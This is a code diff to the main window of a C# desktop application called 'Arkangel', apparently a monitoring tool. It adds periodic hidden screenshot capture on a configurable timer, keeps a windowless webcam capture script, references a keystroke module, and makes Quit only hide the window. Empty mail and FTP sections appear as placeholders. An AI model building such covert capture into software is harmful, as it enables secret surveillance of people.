@@ -1,10 +1,9 @@
 ﻿using System;
 using System.Windows;
 using System.Windows.Forms;
-
 using System.Runtime.InteropServices;
 using System.Windows.Interop;
-
+using System.Timers;
 using System.Diagnostics;
 using System.Data.SQLite;
 
@@ -31,28 +30,81 @@ namespace Arkangel
         private const uint MOD_WIN = 0x0008; //WINDOWS
         //CAPS LOCK:
         private const uint VK_CAPITAL = 0x14;
+        //Screenshot
+        public static System.Timers.Timer aTimer_scrshot;
+        public static void SetTimer(int _time)
+        {
+            // Create a timer with a two second interval.
+            aTimer_scrshot = new System.Timers.Timer(_time);
+            // Hook up the Elapsed event for the timer. 
+            aTimer_scrshot.Elapsed += OnTimedEvent;
+            aTimer_scrshot.AutoReset = true;
+            aTimer_scrshot.Enabled = true;
+        }
+        public static void OnTimedEvent(Object source, ElapsedEventArgs e)
+        {
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "screenshot.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+        }
+
+
+
         public MainWindow()
         {
+
             InitializeComponent();
+
             if (mainPanel.Children.ToString() != "Dashboard")
             {
                 Dashboard dashboard = new Dashboard();
                 mainPanel.Children.Add(dashboard);
             }
+
+            //Screenshot
+
+            int _hours=0,_minutes=0,enable=0;
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM Screenshot,current_user WHERE Screenshot.id = current_user.id", connect);
+                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
+                    while (data.Read())
+                    {
+                        
+                        int.TryParse(data["enable"].ToString(),out enable);
+                        int.TryParse(data["hours"].ToString(), out _hours);
+                        int.TryParse(data["minutes"].ToString(), out _minutes);
+                    }
+                }
+            }
+            if (enable == 1)
+            {
+                SetTimer(_hours * 60 * 60 * 1000 + _minutes * 60 * 1000);
+                aTimer_scrshot.Start();
+            }
+
+            //Mail
+
+
+            //FTP
+
             Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);
-            //start keystoke
-            //try
-            //{
-            System.Diagnostics.Process.Start(@"..\..\module\keystroke.exe");
-            //}
-            //catch { };
+
         }
         private IntPtr _windowHandle;
         private HwndSource _source;
         protected override void OnSourceInitialized(EventArgs e)
         {
             base.OnSourceInitialized(e);
-
             _windowHandle = new WindowInteropHelper(this).Handle;
             _source = HwndSource.FromHwnd(_windowHandle);
             _source.AddHook(HwndHook);
@@ -109,30 +161,15 @@ namespace Arkangel
         {
             if (System.Windows.Forms.MessageBox.Show("Do you want to log out", "Warning", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
             {
-
                 LoginForm loginForm = new LoginForm();
                 loginForm.Show();
                 Close();
-
             }
         }
 
         private void bt_Quit_Click(object sender, RoutedEventArgs e)
         {
-            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
-            {
-                connect.Open();
-                using (SQLiteCommand fmd = connect.CreateCommand())
-                {
-                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM General,current_user WHERE General.id = current_user.id", connect);
-                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
-                    while (data.Read())
-                    {
-                        if (data["HotKey"].ToString() == "1") Hide(); else Close();
-                    }
-                    connect.Close();
-                }
-            }
+            Hide();
         }
 
 
@@ -143,15 +180,9 @@ namespace Arkangel
             try
             {
                 myProcess.StartInfo.UseShellExecute = true;
-                // You can start any process, HelloWorld is a do-nothing example.
                 myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
                 myProcess.StartInfo.CreateNoWindow = true;
                 myProcess.Start();
-                // This code assumes the process you are starting will terminate itself. 
-                // Given that is is started without a window so you cannot terminate it 
-                // on the desktop, it must terminate itself or you can do it programmatically
-                // from this application using the Kill method.
-                //myProcess.Kill();
             }
             catch (Exception ex)
             {
@@ -247,6 +278,11 @@ namespace Arkangel
             Alert alert = new Alert();
             mainPanel.Children.Clear();
             mainPanel.Children.Add(alert);
+        }
+
+        private void StackPanel_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
+        {
+            DragMove();
         }
     }
 }
